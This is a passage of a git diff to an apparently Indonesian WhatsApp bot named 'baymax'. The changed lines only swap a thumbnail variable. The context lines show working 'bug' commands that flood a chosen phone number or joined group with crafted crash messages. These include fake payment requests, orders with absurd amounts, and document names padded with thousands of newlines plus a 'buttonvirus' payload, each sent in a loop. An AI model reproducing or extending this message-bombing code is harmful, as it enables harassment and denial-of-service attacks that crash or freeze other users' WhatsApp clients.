𝗔𝗦𝗘 𝗦𝗜𝗗`, 
 mimetype: `application/txt`, 
-jpegThumbnail: data.thumbnail, 
+jpegThumbnail: ppnyaowner, 
 fileLength: "999999999", 
 mentions:[sender] }, {quoted:gifes})
 await sleep(1000)
@@ -3307,7 +3302,7 @@ currencyCodeIso4217: 'IDR',
 requestFrom: '0@s.whatsapp.net', 
 expiryTimestamp: 8000, 
 amount: 1, 
-background: data.thumbnail }}}}, {quoted:lep})
+background: ppnyaowner }}}}, {quoted:lep})
 await sleep(1000)
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
@@ -3375,10 +3370,10 @@ jumlah = q.split('|')[1]
 let cekno = await baymax.onWhatsApp(numt)
 if (cekno.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
 if (isNaN(jumlah)) return reply(`Harus berupa angka`)
-var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6281390368580@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: data.thumbnail, caption: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
+var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6281390368580@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ppnyaowner, caption: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
 var pollCreation = generateWAMessageFromContent(from,proto.Message.fromObject({pollCreationMessage: {name: 'HALO DEKK 🥶',options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],selectableOptionsCount: 5,},}),{ userJid: from, quoted: lep })
-var messa = await prepareWAMessageMedia({ image: data.thumbnail }, { upload: baymax.waUploadToServer })
-var order = generateWAMessageFromContent(from,proto.Message.fromObject({ orderMessage: { orderId: '594071395007984',orderImage: messa.imageMessage,itemCount: 100000000000,status: 'INQUIRY',surface: 'CATALOG',message: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,jpegThumbnail: data.thumbnail,orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,sellerJid: '628979185922@s.whatsapp.net',token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',totalAmount1000: '500000000000000',totalCurrencyCode: 'IDR',},}),{ userJid: from, quoted: lep })
+var messa = await prepareWAMessageMedia({ image: ppnyaowner }, { upload: baymax.waUploadToServer })
+var order = generateWAMessageFromContent(from,proto.Message.fromObject({ orderMessage: { orderId: '594071395007984',orderImage: messa.imageMessage,itemCount: 100000000000,status: 'INQUIRY',surface: 'CATALOG',message: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,jpegThumbnail: ppnyaowner,orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,sellerJid: '628979185922@s.whatsapp.net',token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',totalAmount1000: '500000000000000',totalCurrencyCode: 'IDR',},}),{ userJid: from, quoted: lep })
 var audio = generateWAMessageFromContent(from,proto.Message.fromObject({audioMessage: {url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',mimetype: 'audio/mpeg',fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',fileLength: '258330',seconds: 16,ptt: false,mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',mediaKeyTimestamp: '1657190832',},}),{ userJid: from, quoted: lep })
 var image = generateWAMessageFromContent(from,proto.Message.fromObject({imageMessage: {url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',mimetype: 'image/jpeg',caption: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',fileLength: '42521',height: 426,width: 640,mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',mediaKeyTimestamp: '1657286523',jpegThumbnail: messa.imageMessage,},}),{ userJid: from, quoted: lep })
 var document = generateWAMessageFromContent(from,proto.Message.fromObject({documentMessage: {url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',mimetype: 'application/octet-stream',title: '.dev',fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',pageCount: 0,mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',fileName: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',mediaKeyTimestamp: '1657288637',},}),{ userJid: from, quoted: lep })
@@ -3394,7 +3389,7 @@ baymax.relayMessage(numt, image.message, { messageId: image.key.id })
 baymax.relayMessage(numt, document.message, { messageId: document.key.id })
 baymax.relayMessage(numt, liveLocation.message, { messageId: liveLocation.key.id })
 baymax.relayMessage(numt, sticker.message, { messageId: sticker.key.id })
-baymax.sendKatalog(numt, `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, data.thumbnail, { quoted: lep })
+baymax.sendKatalog(numt, `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ppnyaowner, { quoted: lep })
 baymax.sendMessage(numt, { text: '', templateButtons: [{ callButton: { displayText: `P`, phoneNumber: ``}},{ urlButton: { displayText: `P`, url: `https://wa.me/`}},{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},]})
 }
 }
@@ -3416,7 +3411,7 @@ currencyCodeIso4217: 'IDR',
 requestFrom: '0@s.whatsapp.net', 
 expiryTimestamp: 8000, 
 amount: 1, 
-background: data.thumbnail }}}}, {quoted:lep})
+background: ppnyaowner }}}}, {quoted:lep})
 await sleep(1000)
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
@@ -3431,10 +3426,10 @@ jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
 let kir = await baymax.groupAcceptInvite(result)
 baymax.sendMessage(kir, { 
-document: data.thumbnail, 
+document: ppnyaowner, 
 fileName: `🔥 baymax BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
 mimetype: `application/txt`, 
-jpegThumbnail: data.thumbnail, 
+jpegThumbnail: ppnyaowner, 
 mentions:[sender] }, {quoted:lep})
 await sleep(1000)
 }
@@ -3449,7 +3444,7 @@ let result = args[0].split('https://chat.whatsapp.com/')[1]
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
 let kir = await baymax.groupAcceptInvite(result)
-var messa = await prepareWAMessageMedia({ image: data.thumbnail }, { upload: baymax.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: ppnyaowner }, { upload: baymax.waUploadToServer })
 var location = generateWAMessageFromContent(kir, proto.Message.fromObject({
 "locationMessage": {
 "degreesLatitude": -6.936928157735237,
@@ -3847,7 +3842,7 @@ let buttoons = [
 ]
 let buttonMessaage = {
 image: { url: yeha }, 
-jpegThumbnail: data.thumbnail,
+jpegThumbnail: ppnyaowner,
 caption: `Nih Kak @${sender.split("@")[0]}`,
 fileLength: "999999999999",
 mentions: [sender],
